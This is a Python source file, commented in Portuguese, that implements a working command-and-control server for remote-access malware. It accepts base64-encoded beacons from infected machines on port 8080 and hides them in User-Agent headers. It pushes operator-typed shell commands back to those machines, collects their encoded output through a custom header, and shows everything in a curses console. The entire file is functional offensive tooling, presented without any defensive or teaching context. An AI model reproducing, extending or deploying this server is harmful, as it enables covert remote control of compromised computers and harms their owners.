import base64
import threading
import time
import curses
from http.server import BaseHTTPRequestHandler, HTTPServer

# Dicionários de estado
COMANDO = None
maquina_conectada = None
lock = threading.Lock()
lock_logs = threading.Lock()
logs = []


class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global maquina_conectada
        global COMANDO
        agente_id = "desconhecido"
        try:
            user_agent = self.headers.get('User-Agent')
            agente_id = base64.b64decode(user_agent).decode()
            with lock:
                if maquina_conectada is None:
                    maquina_conectada = agente_id
                    with lock_logs:
                        logs.insert(0, f"[BEACON] Máquina conectada: {agente_id}")
        except Exception as e:
            with lock_logs:
                print(f"[ERRO] Decodificando beacon: {e}")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        # Verifica se há comando pendente para esse agente
        if COMANDO is not None:
            self.wfile.write(COMANDO.encode())

    def do_POST(self):
        global COMANDO
        agente_id = self.headers.get("User-Agent", "desconhecido")
        output_codificado = self.headers.get("X-Output")

        COMANDO = None
        try:
            output_decodificado = base64.b64decode(output_codificado).decode()
            with lock_logs:
                logs.insert(0,f"\n[RESPOSTA de {agente_id}]:\n{output_decodificado}")
        except Exception as e:
            with lock_logs:
                logs.insert(0, f"[ERRO] Decodificando resposta: {e}")

        self.send_response(200)
        self.end_headers()

def iniciar_servidor():
    servidor = HTTPServer(('0.0.0.0', 8080), SimpleHandler)
    with lock_logs:
        logs.insert(0, "[*] Servidor C2 aguardando conexões na porta 8080...")
    servidor.serve_forever()


def print_logs():
    win2 = curses.newwin(curses.LINES, curses.COLS//2, 0, curses.COLS//2)
    win2.keypad(True)
    while True:
        win2.clear()
        try:
            with lock_logs:
                j = curses.LINES//2
                for i in range(len(logs)):
                    win2.addstr(j, 0, logs[i])
                    # for i in range(0,len(log)):
                    if i != len(logs) - 1:
                        j -= logs[i+1].count("\n") if logs[i+1].count("\n") > 0 else 1
                     
                    if j < 0:
                        break
        except Exception as e:
            print(e)
        win2.refresh()
        time.sleep(1)

def menu_principal(stdscr):
    win1 = curses.newwin(curses.LINES, curses.COLS//2, 0, 0)
    win1.keypad(True)
    state = 0
    global COMANDO
    while state != -1:
        win1.clear()
        c = None
        if state == 0:
            win1.addstr(0,0, "=== MENU PRINCIPAL ===")
            win1.addstr(1,0, "1 - Máquinas conectadas")
            win1.addstr(2,0, "2 - Enviar comandos")
            win1.addstr(3,0, "0 - Sair")
            c = win1.getch()
        elif state == 1:
            if maquina_conectada is None:
                win1.addstr(0,0,"Nenhuma máquina conectada!")
                win1.addstr(3,0, "0 - Voltar")
            else:    
                win1.addstr(0,0,"Máquina conectada:")
                win1.addstr(1,0,f"{maquina_conectada}")
                win1.addstr(3,0, "0 - Voltar")
            c = win1.getch()
        elif state == 2:
            win1.addstr(0,0,"Digite 'voltar' para voltar para o menu.")
            win1.addstr(1,0,"Digite o comando: ")
            c = win1.getstr()

        win1.refresh()
        if state == 0 and c == ord("1"):
            state = 1
        elif state == 0 and c == ord("2"):
            state = 2
            curses.echo()
            curses.curs_set(1)
        elif state == 1 and c == ord("0"):
            state = 0
        elif state == 2 and c.decode("utf-8") == "voltar":
            state = 0
            curses.noecho()
            curses.curs_set(0)
        elif state == 2 and c.decode("utf-8") != "voltar":
            with lock:
                if COMANDO is None:
                    if maquina_conectada is None:
                        logs.insert(0, "Comando ignorado. Máquina não conectada...")
                    else:
                        COMANDO = c.decode("utf-8")
                else:
                    with lock_logs:
                        logs.insert(0, "Aguardando último comando ser executado...")

        elif state == 0 and c == ord("0"):
            state = -1
            with lock_logs:
                logs.insert(0, "Encerrando...")
            
    curses.nocbreak()
    stdscr.keypad(False)
    curses.echo()
    curses.endwin()

def main():
    comando = None
    t_servidor = threading.Thread(target=iniciar_servidor, daemon=True)
    t_servidor.start()
    time.sleep(2)
    stdscr = curses.initscr()
    curses.noecho()
    curses.cbreak()
    curses.curs_set(0)
    

    t_logs = threading.Thread(target=print_logs, daemon=True)
    t_logs.start()

    try:
        menu_principal(stdscr)
    except KeyboardInterrupt:
        with lock_logs:
                logs.insert(0, "Encerrando...")
        curses.nocbreak()
        stdscr.keypad(False)
        curses.echo()
        curses.endwin()



if __name__ == '__main__':
    main()
